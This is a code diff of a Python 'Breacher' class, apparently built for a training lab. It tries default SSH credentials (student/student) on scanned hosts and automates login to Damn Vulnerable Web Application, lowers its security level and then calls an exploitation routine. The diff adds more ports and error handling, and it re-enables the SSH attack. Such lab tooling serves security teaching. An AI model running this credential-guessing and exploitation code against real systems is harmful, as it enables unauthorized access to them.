@@ -2,59 +2,71 @@ import paramiko
 from paramiko import SSHClient
 import requests
 from bs4 import BeautifulSoup
+from tqdm import tqdm
 
 port_dict = {
     '22': 'ssh',
     '80': 'http',
+    '8181': 'http',
+    '8080': 'http',
     '3389': 'rdp'
 }
 
 
 class Breacher:
     def breach(self,
-               ips: list,
-               ports: list):
+               services: dict):
         results = {}
 
-        for ip in ips:
-            result = self.attempt(ip, ports)
-            results[ip] = result
+        for ip in tqdm(list(services.keys())):
+            ports = []
+            for port in list(services[ip]):
+                if port['state'] == 'open':
+                    ports.append(port['port'])
 
+            result = self.attempt(ip, ports)
+            if result:
+                results[ip] = result
         return results
 
     def attempt(self, ip, ports):
         for port in ports:
             match port_dict[port]:
                 case 'ssh':
-                    print()
-                    # if self.attempt_ssh(ip, port) == 'student':
-                    #     return True
+                    if self.attempt_ssh(ip, port) == 'student':
+                        return {'service': 'ssh', 'port': port}
                 case 'http':
                     if self.attempt_http(ip, port):
-                        return True
+                        return {'service': 'http', 'port': port}
 
         return False
 
     @staticmethod
     def attempt_ssh(ip, port):
-        client = SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        client.connect(ip, port=port, username='student', password='student')
-        stdin, stdout, stderr = client.exec_command('whoami')
-        return stdout.read().decode('utf8').rstrip('\n')
+        try:
+            client = SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(ip, port=port, username='student', password='student')
+            stdin, stdout, stderr = client.exec_command('whoami')
+            return stdout.read().decode('utf8').rstrip('\n')
+        except Exception:
+            return '0'
 
     def attempt_http(self, ip, port):
-        response = requests.get(f'http://{ip}:{port}/dvwa/').text
-        if 'Login :: Damn Vulnerable Web Application' in response:
-            s = requests.Session()
-            user_token = self.get_user_token(ip, port, s)
-            login_result = self.login(ip, port, s, user_token)
-            if not login_result:
-                return False
-            result = self.change_security_level(ip, port, s, user_token)
-            if not result:
-                return False
-            return self.pwn_http(ip, port, s, user_token)
+        try:
+            response = requests.get(f'http://{ip}:{port}/dvwa/').text
+            if 'Login :: Damn Vulnerable Web Application' in response:
+                s = requests.Session()
+                user_token = self.get_user_token(ip, port, s)
+                login_result = self.login(ip, port, s, user_token)
+                if not login_result:
+                    return False
+                result = self.change_security_level(ip, port, s, user_token)
+                if not result:
+                    return False
+                return self.pwn_http(ip, port, s, user_token)
+        except Exception:
+            return False
 
     @staticmethod
     def get_user_token(ip, port, s):
